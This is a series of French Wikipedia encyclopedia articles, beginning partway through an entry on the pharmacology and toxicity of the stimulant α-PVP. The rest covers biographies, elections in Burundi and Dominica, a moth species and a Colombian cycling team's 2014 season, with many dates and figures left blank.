Elle est synthétisée à partir de la valérophénone en deux étapes.
Pharmacologie.
Les données pharmacologiques concernant l'α-PVP sont peu nombreuses et portent principalement sur des modèles animaux.
Pharmacocinétique.
L"'alpha"-PVP semble posséder une bonne biodisponibilité orale et provoquer des effets psychotropes plus rapidement que la méthamphétamine. Elle semble être métabolisée par le foie, par des enzymes de la famille des , les , 2D6, 2C19, 3A4, ce qui produit une dizaine de métabolites, principalement par 2-hydroxylation, déshydrogénation ou rupture du cycle pyrrolidine.
Pharmacodynamie.
L'alpha-PVP est un stimulant puissant du système nerveux central, ce qui est dû à son action sur la noradrénaline, la dopamine, et sur la sérotonine.
Elle agit sur les transporteurs NET et DAT des catécholamines comme la noradrénaline ou la dopamine, comme un agoniste des récepteurs D1 et D2 de la dopamine, des récepteurs à la noradrénaline mais se comporte également comme un inhibiteur sélectif de la recapture des catécholamines.
En agissant sur les récepteurs à la dopamine et sur la phosphorylation de la protéine CREB dans le noyau accumbens, l'α-PVP stimule le circuit de récompense chez le rat.
À l'instar de la cocaïne, des amphétamines ou des autres cathinones, l'α-PVP agirait comme un catécholaminergique et comme un sérotoninergique, ce qui produit une cascade d'effets sympathicomimétiques.
L'α-PVP se lie aux transporteurs SERT de la sérotonine et agit "in vitro" comme agoniste de ses (Ki= ). 
Elle produit des effets stimulants dose-dépendants chimiquement plus similaires à ceux de la MDPV ou de la cocaïne qu'à ceux de l'amphétamine.
En suit une vasoconstriction, une hausse de la pression artérielle, une tachycardie et, à fortes doses, des comportements paradoxaux, étranges, agressifs voire violents.
Ont été remarqués des anomalies de l'équilibre acido-basique, des troubles de la coagulation (pouvant mener à des accidents vasculaires cérébraux), un taux plasmatique de créatinine phosphokinase (CPK) élevé, souvent due à une activité musculaire intense, et à une élévation du taux de lactates.
Peuvent se produire :
Plusieurs cas de morts dues à l"'alpha"-PVP ont déjà été répertoriés.

</doc>
<doc id="8731034" url="https://fr.wikipedia.org/wiki?curid=8731034" title="Tom Peters">
Tom Peters

Tom Peters est un consultant — ex-Mc Kinsey — et un auteur américain, spécialiste du management et célèbre en particulier pour son livre "Le Prix de l'excellence" avec Robert Waterman.
"Le Prix de l'excellence".
1983. Trois millions d'exemplaires
Quarante cinq prescriptions pour un monde à l'envers.
"Le Chaos Management"
Bibliographie.
Années 1980
Années 1990
Années 2000

</doc>
<doc id="8731039" url="https://fr.wikipedia.org/wiki?curid=8731039" title="Élections législatives burundaises de 2015">
Élections législatives burundaises de 2015

Les élections législatives burundaises de 2015 ont lieu après plusieurs reports le pour renouveler les de l'Assemblée nationale.
Le CNDD-FDD conserve sa majorité avec 86 sièges sur 121. 
Contexte.
Les élections législatives précèdent l'élection présidentielle burundaise de 2015.
Une forte opposition à la troisième candidature du président Pierre Nkurunziza à l'élection présidentielle burundaise de 2015 perturbe la préparation des élections législatives.
Système électoral.
L'Assemblée nationale est la chambre basse du parlement bicaméral du Burundi.
L'assemblée est dotée d'un minimum de pourvus pour cinq ans au scrutin proportionnel dans 18 circonscriptions électorales plurinominales correspondant aux provinces du pays. La composition des listes est bloquée, avec pour trois noms successifs un maximum de deux hommes et de deux personnes du même groupe ethnique. 
Les sièges sont répartis selon la méthode d'Hondt à tous les partis ayant franchi le seuil électoral de 2 % des suffrages exprimés. Un nombre variable de députés supplémentaires s'ajoute à ce total de telle sorte que la répartition finale des membres de l'assemblée corresponde à un ratio 60-40 entre Hutus et Tutsis, auquel s'ajoute un quota de 30 % de femmes. L'ensemble des membres cooptés sont choisis par la Commission électorale nationale indépendante (Céni) parmi les candidats non élus figurant sur les listes des partis ayant remporté au moins un siège au scrutin direct, en concertation avec ces derniers.
Enfin, trois membres de l’ethnie Twa sont cooptés par la Céni sur la base de liste présentées par leurs organisations représentatives reconnues, en tenant compte du sexe et de la répartition géographique.
Campagne.
En janvier, les élections initialement sont prévues le , avant d'être repoussées au .
Le la déclaration finale du sommet des chefs d’État d'Afrique de l'Est demande un report d'au moins un mois et demi des élections législatives et communales mais ne mentionne pas la troisième candidature de Pierre Nkurunziza.
Début juin, Les observateurs de l'Union européenne quittent le pays tandis que l'Église catholique se retire du processus électoral. La vice-présidente de la Commission électorale nationale indépendante (Ceni) et une autre commissaire démissionnent et fuient le pays.
Le , les élections sont repoussées à une date ultérieure. Le , la présidence annonce la tenue des élections pour le 29 du mois.
Suites.
Le CNDD-FDD, parti du Président Pierre Nkurunziza, perd quatre sièges sur le total de ceux élus mais conserve une large majorité à l'Assemblée nationale avec 86 sièges sur 121. La mission d’observation électorale des Nations unies estime que ces élections ne sont « ni libres, ni crédibles ».
Le , Pascal Nyabenda est élu président de l'Assemblée, l'opposant Agathon Rwasa premier vice-président et le ministre de l'Intérieur Édouard Nduwimana second vice-président. Les trois hommes étaient les uniques candidats à chacun de ces postes.

</doc>
<doc id="8731042" url="https://fr.wikipedia.org/wiki?curid=8731042" title="Georg Luger">
Georg Luger

Georg Johann Luger ( – ) était le concepteur autrichien du célèbre pistolet Luger et de la cartouche 9 × 19 mm Parabellum.
Jeunesse et service militaire.
Georg Luger naquit à Steinach am Brenner, dans le Tyrol. Il est le fils du Dr Bartholomaeus von Luger, un chirurgien. Après la naissance de Georg, sa famille s’installe en Italie, où le Dr Luger enseigna à l'université de Padoue. Georg grandit avec l'italien comme deuxième langue maternelle et termina l’école primaire ("Grundschule") et l’école pré-universitaire ("Gymnasium") en Padoue autrichienne. Après ses études, ses parents l'envoyèrent à Vienne où il étudia à l'académie de commerce de Vienne ("Wiener Handelsakademie"), le prédécesseur de la "Vienna Business School" actuelle.
En , Luger se porta volontaire pour le service militaire et fut affecté comme élève-officier de réserve au . Il fut promu "Cadett-Corporal" le , et aspirant ("Faehnrich") le octobre. L’adresse au tir de Luger attira l'attention de ses supérieurs, et il fut envoyé à l’école militaire austro-hongroise des armes à feu à Camp Bruckneudorf, où il devint rapidement instructeur. Là, son intérêt pour les systèmes de chargement automatique s’éveilla. En 1871, Luger fut promu lieutenant de réserve ("Leutnant der Reserve") et devint réserviste.
Famille.
Luger épousa Elisabeth Josefa Dufek en 1873. Il s’installa à Vienne avec elle et ils eurent trois enfants (dans l'ordre):
Le premier fils de Luger, Georg Franz, devint ingénieur civil et rejoignit son père dans le développement des armes militaires. Son deuxième fils fut tué, alors qu’il était capitaine de réserve (Hauptmann D.R.), durant la Première Guerre mondiale sur le front de Galicie en 1915.
Après l'armée.
Après avoir quitté l'armée, Luger travailla comme comptable et plus tard dans la gestion du Jockey Club, l'un des principaux cercles sociaux à Vienne.
Il rencontra Ferdinand von Mannlicher aux environs de 1875 et les deux collaborèrent à la conception d’un magasin de fusil, qui sembla réveiller le talent latent de concepteur de Luger.
En 1891, Luger fut employé par Ludwig Loewe &amp; Company (à Berlin, Allemagne) et devint progressivement consultant concepteur.
En 1894, il fut envoyé pour faire une démonstration à l'armée de terre américaine d’une arme conçue par Hugo Borchardt, fabriquée par la Deutsche Waffen und Munitionsfabriken (DWM) (qui avait évolué à partir de la Loewe après la mort de son fondateur). L'armée rejeta le pistolet mais, tirant parti des critiques, Luger l’améliora, créant le pistolet Parabellum (communément appelé Luger). Ce pistolet fut un succès pour Luger et DWM.
Le contrat de Luger avec DWM fut annulé en 1919 et il poursuivit l'entreprise avec succès à propos de redevances de brevets. Cependant Luger avait perdu toutes ses économies à ce moment-là.

</doc>
<doc id="8731043" url="https://fr.wikipedia.org/wiki?curid=8731043" title="Énolisable">
Énolisable



</doc>
<doc id="8731046" url="https://fr.wikipedia.org/wiki?curid=8731046" title="Indicateur d'amidon">
Indicateur d'amidon



</doc>
<doc id="8731048" url="https://fr.wikipedia.org/wiki?curid=8731048" title="Georg Johann Luger">
Georg Johann Luger



</doc>
<doc id="8731060" url="https://fr.wikipedia.org/wiki?curid=8731060" title="Félix Jeantet">
Félix Jeantet

Félix Jeantet, né à Saint-Claude (Jura) le et mort à Paris le , est un poète, journaliste et critique d'art français de la fin du et du début du .
Biographie.
Avocat à la cour d'appel et membre de la conférence Molé-Tocqueville (qu'il préside jusqu'en 1886), Félix Jeantet délaisse bientôt le barreau au profit d'une carrière littéraire.
Proche des Parnassiens et notamment de François Coppée, il est remarqué par la critique en 1887 grâce à la publication d'un recueil de poésies, "Les Plastiques" (G. Charpentier et ). En 1889, il est nommé officier d'Académie.
De 1892 à 1901, Jeantet est le rédacteur en chef puis le directeur littéraire de "La Revue hebdomadaire" de Pierre Mainguet, dans laquelle il utilise à l'occasion le pseudonyme de Claude Bienne (référence à sa ville natale, traversée par la Bienne). Il contribue également à de nombreuses autres publications. En 1902, il fonde avec René-Marc Ferry la revue littéraire bimensuelle "Minerva" dont les collaborateurs les plus réguliers sont Frédéric Plessis, Henry Bordeaux, André Beaunier, Jacques Bainville, Jean Renouard, Frantz Funck-Brentano, Arthur Chuquet, Dauphin Meunier et Charles Maurras.
En , Félix Jeantet épouse Marguerite Chavin à Saint-Claude. Le couple aura une fille, Élisabeth, ainsi que trois fils : Louis (homme d'affaires, créateur de la Fondation Louis-Jeantet), Claude et Gabriel Jeantet (tous deux journalistes et condamnés après la Seconde Guerre mondiale pour faits de collaboration).
Lors de l'affaire Dreyfus, il adhère à la Ligue de la patrie française (antidreyfusarde), dont il intègre le comité. Il fait également partie des donateurs du « monument Henry », une souscription lancée par Marie-Anne de Bovet dans "La Libre Parole" pour aider la veuve du colonel Henry à assumer les frais de son action en justice contre Joseph Reinach. Proche de l'Action française, il accepte la présidence d'honneur du groupe des Camelots du roi de Saint-Lupicin (section du Haut-Jura de la ligue d'Action française) le . Deux de ses fils, Claude et Gabriel, appartiennent à leur tour au mouvement maurrassien dans les années 1920 avant d'évoluer vers le fascisme.
Félix Jeantet meurt le dans le de Paris, et, est inhumé à Saint-Lupicin.

</doc>
<doc id="8731062" url="https://fr.wikipedia.org/wiki?curid=8731062" title="Madeleine de Proust">
Madeleine de Proust

L'expression « madeleine de Proust » qualifie tout phénomène déclencheur d'une impression de réminiscence. Ce peut être un élément de la vie quotidienne, un objet, un lieu, un geste, un son ou une couleur par exemple, qui ne manque pas de faire revenir ou réactiver un souvenir à la mémoire de quelqu'un, comme le fait une madeleine à celle du narrateur d"'À la recherche du temps perdu" dans "Du côté de chez Swann" (1913), le premier tome du roman de Marcel Proust.
Origine.
Dans le roman de Proust, le passage en question est celui-ci :
L'effet décrit par Proust est lié à la mémoire involontaire : la réminiscence provoquée par la madeleine ne vient pas d'un effort conscient à se remémorer tel ou tel souvenir, et le narrateur ne se doute pas que la madeleine qu'il va déguster va faire renaître des souvenirs oubliés. Par contraire, Proust écrit : « Les renseignements que la mémoire volontaire donne sur le passé ne conservent rien de lui. »
Le souvenir de la madeleine est lié à l'habitude de sa tante qui lui donnait des madeleines trempées au préalable dans son thé.

</doc>
<doc id="8731076" url="https://fr.wikipedia.org/wiki?curid=8731076" title="Jessica Havok">
Jessica Havok



</doc>
<doc id="8731079" url="https://fr.wikipedia.org/wiki?curid=8731079" title="Havok (catch)">
Havok (catch)



</doc>
<doc id="8731092" url="https://fr.wikipedia.org/wiki?curid=8731092" title="Thomas Holland (jésuite)">
Thomas Holland (jésuite)

Thomas Holland, né en 1600 à Sutton, quartier de St Helens dans le Lancashire (Angleterre), et mort (exécuté) le à Tyburn, est un prêtre jésuite anglais. Rentré en Angleterre après sa formation religieuse sur le continent, il est arrêté et exécuté en haine de la foi. Considéré comme martyr par l’Église catholique, il est béatifié en 1929 avec cent six autres catholiques martyrisés comme lui. Figurant aussi dans la liste des martyrs de Douai il est vénéré par l'Église catholique le 4 mai avec le groupe des Cent sept martyrs d'Angleterre et du pays de Galles et individuellement le .
Biographie.
Probablement fils du gentilhomme Richard Holland, Thomas Holland fait ses études au collège anglais de Saint-Omer (Pays-Bas méridionaux). Puis, en , au séminaire anglais de Valladolid (Espagne) où il fait le . Lorsque les négociations en vue du mariage entre Charles Ier d’Angleterre et l’infante Marie-Anne d’Espagne échouent, la tension politico-religieuse monte entre l'Espagne et l’Angleterre. Holland est envoyé à Madrid pour assurer le prince Charles de la loyauté des séminaristes anglais de Valladolid, ce qu'il fit dans un discours en latin.
En 1624, il entra au noviciat de la Compagnie de Jésus à Watten dans les Pays-Bas méridionaux et peu après est ordonné prêtre à Liège. Après avoir servi comme administrateur à Gand et préfet au collège de Saint-Omer, il fait sa profession religieuse définitive comme 'coadjuteur spirituel' à Gand () et est envoyé rejoindre la mission anglaise l'année suivante (1635). Il fut un adepte du déguisement et, outre sa langue natale, s’exprimait sans difficulté en français, espagnol et flamand.
Après sept and de ministère pastoral clandestin, Thomas Holland est finalement arrêté dans une rue de Londres le et emprisonné à la New prison. Il est ensuite transféré à la prison de Newgate et accusé au tribunal () d’être un prêtre catholique. Aucune preuve concluante n'est présentée, mais comme il refuse de jurer qu'il ne l'est pas, le jury le reconnaît coupable, ce qui suscite l’indignation du lord-maire de Londres, Isaac Penington, et d’un autre juge nommé Garroway. Le samedi , le Sergent Peter Phesant, le condamne à mort. À son retour en prison, Holland continue son ministère carcéral et entend plusieurs confessions.
Le dimanche et le lundi, il est autorisé à célébrer une messe en prison. Après sa dernière messe, il est emmené pour l'exécution. Il lui est encore permis de s’adresser à la foule et de prononcer plusieurs prières, entre autres pour le roi Charles et ses sujets, priant pour qu’ils reviennent au catholicisme. Il reconnaît alors publiquement qu’il est catholique, prêtre et jésuite. Thomas Holland est alors pendu . Cela se passe le , et Thomas Holland n’a que 42 ans.

</doc>
<doc id="8731099" url="https://fr.wikipedia.org/wiki?curid=8731099" title="The Ikettes">
The Ikettes

The Ikettes est un groupe américain composé de femmes, elles jouaient avec Ike Turner et sa femme, la chanteuse Tina Turner. Le duo Ike and Tina Turner, spécialisé dans le "rhythm and blues", a connu une renommée nationale dans les années 1960, puis internationale dans les années 1970.
Carrière.
Ike Turner créé The Ikettes pour remplacer les Artettes, le groupe qui passait avant le groupe the Ike &amp; Tina Turner, en tournée.
Ike Turner trompe ouvertement Tina Turner, avec Ann Thomas, une « Ikette » avec qui il aura un enfant et qu'il épousera en 1981.
En France, cette formation, son apparence vestimentaire et ses chorégraphies, inspirent directement Claude François dès les années 1960, pour ses danseuses Claudettes ou « Clodettes ».

</doc>
<doc id="8731106" url="https://fr.wikipedia.org/wiki?curid=8731106" title="Geo Condé">
Geo Condé

Georges Jean Condé, dit Geo Condé (ce qui se prononce « Jo Condé »), est un artiste, peintre, sculpteur, céramiste et marionnettiste français né le à Frouard (Meurthe-et-Moselle) et mort le au hameau La Poste-de-Velaine (commune de Velaine-en-Haye, Meurthe-et-Moselle), où il résidait depuis 1960. 
Biographie.
Fils d'un épicier de Frouard, Georges Condé s'initie très tôt à la peinture et à la musique. Vers l’âge de dix ans, il construit un petit théâtre de marionnettes éclairé à la bougie. Un incendie accidentel parti de ce castelet manque de mettre le feu à la maison familiale.
Lors de la fermeture des écoles religieuses en France, ses parents l'envoient en pension en Belgique. Il y termine ses études et entre à l'école d’architecture de Bruxelles. Après avoir été mobilisé (pour trois ans normalement) en 1911, il participe à la Grande Guerre et passe en 1916 son brevet d'aviateur. Après sa démobilisation, il entre à l'École nationale supérieure d'art de Nancy, où il est l'élève de Victor Prouvé. Il avait épousé sa cousine Marguerite Baudot le à Gevrey-Chambertin et leur premier enfant, Bruno Condé, est né en 1920.
Le sculpteur et le céramiste.
En 1922, au moment du rachat de l'entreprise Keller &amp; Guérin par la famille Fenal, Georges Condé intègre le groupe Faïencerie de Lunéville-Saint-Clément et Badonviller comme modéliste quasiment en même temps que les frères Mougin. Il sera d'abord chargé de décorer les vases créés par les frères Mougin , avec une légère influence du cubisme, et de réaliser des motifs décoratifs pour les faïences de table .
Il y développera ensuite un bestiaire en faïence craquelée pour Saint-Clément — dont une grande panthère, un poisson exotique, un pingouin en 1931 pour le Bon Marché... — un des sculpteurs les plus prolifiques de la faïencerie avec Charles Lemanceau . Ces animaux sont édités notamment pour les ateliers d'art des grands magasins (Primavera, la Maîtrise, Pomone...) en cela fidèle à l'enseignement de son maître, Victor Prouvé, qui avait lancé un mouvement en faveur de "l'art pour tous" . 
Geo Condé figure en 1931 dans le dictionnaire biographique des artistes contemporains. Il devient à partir de 1933 (ou beaucoup plus tôt, selon les sources) le conseiller artistique de la faïencerie de Lunéville-Saint-Clément, jusqu'en 1939, date à laquelle il sera de nouveau mobilisé . Ses modèles en faïence (vases, figurines, bestiaire et vaisselle), dans la tendance Art déco, sont aujourd’hui recherchés par les collectionneurs .
Le peintre.
À partir de 1920, Georges Condé côtoie les peintres Louis Guingot et son fils sculpteur Henri Guingot, Gaston Ventrillon (dit le jeune), Victor Guillaume, etc. dans la "Jeune école Lorraine". Il expose dès 1923 à Paris et Nancy et présente en 1924 un tableau, "Paysage à Liverdun", au Salon des indépendants, où il expose jusqu'en 1929. Il développe un style très original, un « tempérament » – qui parfois déplaît –, ce qui explique qu'en 1926, à l'occasion du « comité Nancy-Paris », une de ses toiles, où figure un nu féminin, ait été retournée face contre mur ! Il continue à peindre jusqu'en 1978.
En 1928, il expose au Salon d'automne les toiles "Paysage en Espagne" et "Paysage en Lorraine". La diversité des techniques est l'une des caractéristiques de son tempérament. Dans les années 1920, la peinture au couteau alterne avec des huiles parfaitement lisses, des sanguines et des gouaches aux couleurs vives. Les sujets, portraits ou paysages, sont librement stylisés, voire, pour les paysages urbains, reconstruits ou vus d'un ciel imaginaire. À partir de 1946 il pratiquera en outre la peinture sous le verre inspirée des ex-voto d'Europe centrale. Les sujets, d'abord sacrés, se diversifient bientôt pour faire place aux coqs stylisés et aux nus qui, sur tous les supports, l'inspirent particulièrement. Chaque été, dans les années 1950, il visite une région (Bretagne, Corse, Normandie, Côte d’Azur…) d'où il rapporte des paysages, fidèles à la réalité mais généralement dépouillés, associant pastel, fusain, crayon, gouache, qui s'ajoutent aux sites de la Lorraine, depuis les montagnes vosgiennes jusqu'aux rudesses du Nord en passant par le plat pays qui les relie, dont il a su capter les couleurs timides. Sa peinture à l'huile des années 1950 est au contraire très colorée et riche de fantaisie. Cette période voit également une brève incursion dans le domaine de l'abstraction. Dans les années 1960, il ira jusqu'au bout de sa fascination pour les dessins d'enfants où l'essentiel est privilégié, en représentant des chats filiformes dont le premier exemplaire sera relégué dans un coin obscur du Salon des artistes lorrains. La même année, la ville d'Épinal lui décerna son grand prix. Dans l'intimité, il disait volontiers s'y être senti mieux apprécié qu'à Nancy.
Théâtre et marionnettes.
Il est associé à la création, en 1934, d'un théâtre de marionnettes à fils au sein du Groupe des étudiants catholiques (GEC) de Nancy, Il en recevra à l'occasion de l'Exposition universelle de 1937 une médaille d'argent . En 1941, il forme Jacques Félix (futur créateur des Comédiens de chiffons et du Festival mondial des théâtres de marionnettes de Charleville-Mézières) aux techniques de la marionnette à gaine. En 1947 il crée sa propre compagnie, le « Théâtre de la Maison de Lorraine ». Sa compagnie propose des spectacles de marionnettes à gaines et à fils pour tous les âges jusque dans les années 1960. Le festival "Geo Condé", de renommée internationale dans le domaine des marionnettes, est organisé tous les deux ans par l'association "Action Culturelle du Val de Lorraine". Les deux dernières éditions étant 2019 et 2021. 

</doc>
<doc id="8731114" url="https://fr.wikipedia.org/wiki?curid=8731114" title="Mairie de Kotka">
Mairie de Kotka

 
La Mairie de Kotka () est un bâtiment situé à Kotka en Finlande.
Histoire.
Le bâtiment est conçu par Erkki Huttunen dans un style fonctionnaliste, sa construction se termine en 1934.
L'édifice de 6 niveaux est en bordure orientale de la place du marché de Kotka.

</doc>
<doc id="8731116" url="https://fr.wikipedia.org/wiki?curid=8731116" title="Saint-victor de buthon">
Saint-victor de buthon



</doc>
<doc id="8731153" url="https://fr.wikipedia.org/wiki?curid=8731153" title="Catocala electa">
Catocala electa

LÉlue (Catocala electa) est une espèce de lépidoptères de la famille des Erebidae.
Description.
L'envergure des imagos varie de 65 à . Posée sur les écorces, ailes supérieures repliées, cette espèce, comme les autres de ce genre, est très mimétique.
Distribution.
Eurasiatique, de l'Europe (rare visiteur dans les îles Britanniques), jusqu'à la Corée.
Biologie.
Les adultes volent de juillet à septembre, ils fréquentent des régions de basse altitude, boisées de forêts mixtes humides où se trouvent les plantes nourricières de la chenille : saules et peupliers. C'est une espèce univoltine.
Voir aussi.
Articles connexes.
Autres espèces du genre "Catocala" qui peuvent lui ressembler, notamment 

</doc>
<doc id="8731156" url="https://fr.wikipedia.org/wiki?curid=8731156" title="Alfred Krauße">
Alfred Krauße

Alfred Lorenz Krauße, né le à Lößnitz et mort le à Leipzig, est un peintre, graveur sur cuivre et acier saxon dont il reste de nombreuses œuvres, notamment des illustrations de livres, des paysages et des portraits. Originaire de la région des Monts Métallifères, il est l'un des étudiants du caricaturiste anglais Henry Winkles à Karlsruhe. Il passe sa vie dans la ville saxonne de Leipzig où il meurt.

</doc>
<doc id="8731163" url="https://fr.wikipedia.org/wiki?curid=8731163" title="Brwinów (homonymie)">
Brwinów (homonymie)



</doc>
<doc id="8731165" url="https://fr.wikipedia.org/wiki?curid=8731165" title="Élections législatives dominiquaises de 2014">
Élections législatives dominiquaises de 2014

Les élections législatives dominiquaises de 2014 se sont déroulées le sur l'île de Dominique. Le Parti travailliste de la Dominique (gauche) recule, mais conserve une majorité absolue.
Mode de scrutin.
L'Assemblée de la Dominique est un parlement monocaméral composé de , dont 21 sont pourvus au suffrage direct au scrutin uninominal majoritaire à un tour dans autant de circonscriptions. Neuf autres membres, dits sénateurs, sont désignés par le président de la Dominique dont cinq sur recommandation du Premier ministre et quatre sur celle du chef de l'opposition. Enfin les deux derniers sièges sont réservés au procureur général et au président de l'Assemblée s'ils ne sont pas issus des rangs des parlementaires. La durée du mandats des membres du parlement est de cinq ans.

</doc>
<doc id="8731166" url="https://fr.wikipedia.org/wiki?curid=8731166" title="Cleanskin">
Cleanskin



</doc>
<doc id="8731169" url="https://fr.wikipedia.org/wiki?curid=8731169" title="Saison 2014 de l'équipe cycliste EPM-UNE-Área Metropolitana">
Saison 2014 de l'équipe cycliste EPM-UNE-Área Metropolitana

La saison 2014 de l'équipe cycliste EPM-UNE-Área Metropolitana est la seizième de cette équipe colombienne, lancée en 1999 et dirigée par Raúl Mesa. Deux succès remarquables se détachent lors des bilans, les victoires d'Óscar Sevilla dans le Tour de Colombie et le Tour de Rio.
Déroulement de la saison.
Premier semestre.
Bien qu'elle doive compenser le départ de Giovanni Báez, dans l'équipe depuis sept ans, la formation commence sa saison comme elle avait terminé la précédente, par une victoire. Quatre-vingt participants sont au départ du ', première épreuve du calendrier national colombien 2014. Malgré de nombreuses tentatives d'échappées, les EPM-UNE travaillent pour que le peloton arrive groupé. Dans le sprint massif qui clôt la course, trois des leurs terminent dans les cinq premiers, dont le vainqueur Stiber Ortiz. Par contre, onze jours plus tard, la formation ne peut empêcher Javier Gómez de mener à bien son échappée, et de remporter le ' à Tuta.
En raison du mondial de football, les équipes colombiennes doivent séparer leur saison en deux. Un premier pic de forme avant une pause obligatoire et un second pic pour enchaîner le Tour de Colombie et le Clásico RCN. Mi-janvier, Raúl Mesa, le directeur technique de la formation, annonce que lors du premier trimestre de compétition, les coureurs iront disputer le Tour de Sao Paulo (épreuve de l'UCI America Tour 2014), pour pallier le manque de courses à étapes dans le calendrier national colombien, à cette date.
Peu de temps avant de partir au Brésil, l'équipe signe avec un troisième co-sponsor. L'Aire Métropolitaine de Medellín décide de faire connaître et promouvoir ses activités par l'intermédiaire du cyclisme. Dans le pays frontalier, la formation subit la domination de l'équipe Funvic Brasilinvest. Elle finit deuxième au classement par équipes mais à vingt minutes des Brésiliens. Leur leader Óscar Sevilla, pourtant trois fois deuxième d'étapes, échoue dans sa quête de podium, en terminant quatrième. Walter Pedraza, sixième, est le seul à remporter une étape. Il devance son compatriote Edson Calderón à l'arrivée de la septième, jugée en côte.
Le 19 février, douze coureurs de l'équipe prennent part à la première course par étapes du calendrier national colombien, la ". Dès le prologue, la formation et son leader Óscar Sevilla réaffirment leur leadership sur le peloton colombien. Le lendemain, le Colombo-espagnol est le seul à pouvoir suivre Mauricio Ortega, dans sa fugue, renforçant, ainsi, sa place de leader de la course. Deux nouvelles victoires d'étape permettent à Sevilla de conserver son titre, qu'il assortit du classement par points, tandis que sa formation s'impose dans le classement par équipes.
Après une longue interruption du calendrier, le retour à la compétition se fait à la ", avec la même réussite. Óscar Sevilla devient le premier triple vainqueur de l'épreuve. La formation rafle les trois étapes, les classements par points (Sevilla), des étapes volantes (Jaime Castañeda) et par équipes. De plus Camilo Castiblanco accompagne son leader sur le podium final. Juan David Montoya remporte sa première victoire en catégorie Élite, le premier jour. Le lendemain, Óscar Sevilla s'impose dans l'étape-reine et s'installe en tête du classement général, place qu'il conforte en gagnant le contre-la-montre de clôture.
Ayant remporté le titre sept ans consécutivement, l'équipe arrive à la ", avec la volonté de récupérer le trophée, abandonné au profit de Juan Pablo Villegas, la saison précédente. Raúl Mesa y inscrit quatorze coureurs plus un nouveau venu, le Portoricain John Paul Llorens, dans la catégorie Espoir. Ce dernier est soutenu par la fédération cycliste de son île, il vient s'aguerrir dans les rangs de sa nouvelle formation. Même s'il faut attendre début avril, pour assister à cette nouvelle épreuve du calendrier, le résultat est identique. Óscar Sevilla s'impose, grâce à sa domination dans le contre-la-montre. En gagnant une des dernières courses à étapes colombiennes n'étant pas encore à son palmarès, il devient le premier coureur d'origine étrangère a remporté cette compétition. Trois autres membres de l'équipe terminent dans les dix premiers.
La semaine suivante ont lieu les Championnats de Colombie sur route. De nombreux dysfonctionnements dans l'organisation empêchent certains coureurs de disputer l'épreuve du contre-la-montre. Ainsi Róbigzon Oyola, sous les couleurs de la ligue cycliste de Tolima, ne peut se présenter au départ à temps, alors qu'il faisait partie des favoris. Finalement seul Weimar Roldán participe, il termine à la onzième place.&lt;br&gt;Le samedi 12, se déroule la course en ligne Élite. Après une multitude de tentatives, dans le sixième tour, un groupe de quatorze s'échappe. Il va compter jusqu'à d'avance. Le champion 2013 Walter Pedraza, sous les couleurs de la ligue de Cundinamarca, Róbigzon Oyola et Juan Pablo Suárez font partie de l'échappée, réduite à neuf hommes, qui se disputent le titre, quatre tours plus tard. Suárez réussit à obtenir la médaille de bronze, à l'issue du sprint, alors que Oyola et Pedraza échouent aux cinquième et neuvième places, respectivement. Moins de quarante secondes plus tard arrive le peloton où quatre hommes de la formation ont pris place, dont le mieux classé est Jaime Castañeda, treizième.
Le mercredi 16, malheureux lors des championnats, Róbigzon Oyola s'impose dans la ", un contre-la-montre en côte. Cette épreuve hors-calendrier national est coorganisée par Weimar Roldán, et voit une ample participation de ses coéquipiers. Ceux-ci terminent à trois dans les quatre premiers.
Huit jours plus tard, la formation est au départ de la '. Une nouvelle fois, les coureurs EPM-UNE dominent une course à étapes du calendrier national colombien. Ils remportent trois étapes sur cinq et terminent aux deux premières places du classement général individuel. Cette fois encore, Óscar Sevilla s'impose mais il ne finit qu'avec sept secondes d'avance sur son coéquipier Rafael Infantino, vainqueur de la ', un contre-la-montre en côte, du deuxième jour. Tandis que, tenant du titre, Sevilla s'empare de la tête de la course, en gagnant la première étape, Weimar Roldán s'impose en solitaire dans la dernière, disputée sous la forme d'un critérium.
Le mai, Walter Pedraza participe à une épreuve hors-calendrier national, la "". Il termine deuxième derrière César Villegas.
Sur les cent dix-neuf coureurs qui prennent le départ de la ', treize font partie de l'effectif (dix sous les couleurs de l'équipe, trois dans une équipe mixte). Trois hommes terminent dans les six premiers mais le titre général leur échappe. La première étape voit le leader de la formation "Aguardiente Antioqueño", Alex Cano s'imposer au sprint, à Yarumal, devant Óscar Sevilla. Le lendemain, Rafael Infantino s'impose à son compagnon d'échappée Camilo Gómez. Leur avance est telle qu'ils se disputent le titre entre eux. Mais Gómez prend un ascendant décisif sur Infantino dans la ' du quatrième jour. Ainsi, bien que les EPM-UNE s'imposent dans le classement par équipes et Sevilla dans le classement de la régularité, au classement général individuel, Rafael Infantino n'est que deuxième et Óscar Sevilla quatrième.
Aux mêmes dates se déroulent au Mexique, les Championnats panaméricains de cyclisme sur route, deux hommes de la formation y sont sélectionnés : Juan Pablo Suárez et Weimar Róldan. Suárez termine quatrième du contre-la-montre, en ne réussissant pas à s'immiscer à la lutte pour les médailles. Il n'en va pas de même, trois jours plus tard. Dans la course en ligne, Suárez fait partie du quatuor qui s'isole en tête de la course, à trois tours de l'arrivée. Au sprint, il ne peut rien face à Byron Guamá, nouveau champion panaméricain, mais parvient à s'octroyer la médaille de bronze. Róldan termine cinquième, avec un retard de .
Puis dans la "", la victoire dans le classement général individuel revient à Rafael Infantino. En l'absence de son leader Óscar Sevilla, Infantino, deuxième des deux dernières courses par étapes auxquelles il a participé, remporte le contre-la-montre du dernier jour. Il efface les vingt-cinq secondes de retard qu'il avait sur César Villegas pour s'emparer du titre. Ses coéquipiers Jaime Castañeda et Walter Pedraza s'imposent, quant à eux, à l'arrivée de la première étape et dans le classement de la régularité. Par contre, la formation échoue pour trois secondes face aux "Aguardiente Antioqueño", dans le classement par équipes.
À la mi-juin, le directeur technique Raúl Mesa détaille le programme du deuxième semestre de compétition. Pendant l'interruption de la saison cycliste colombienne en raison de la Coupe du monde, chaque coureur bénéficie d'une préparation spécifique en vue d'affronter les différents objectifs fixés. Après avoir participé à la "", le principal d'entre eux est de conserver le titre d'Óscar Sevilla au Tour de Colombie. La suite de la saison s'articule autour du calendrier national avec des escapades à l'étranger pour disputer le Tour de Rio et le Tour du Guatemala.
Deuxième semestre.
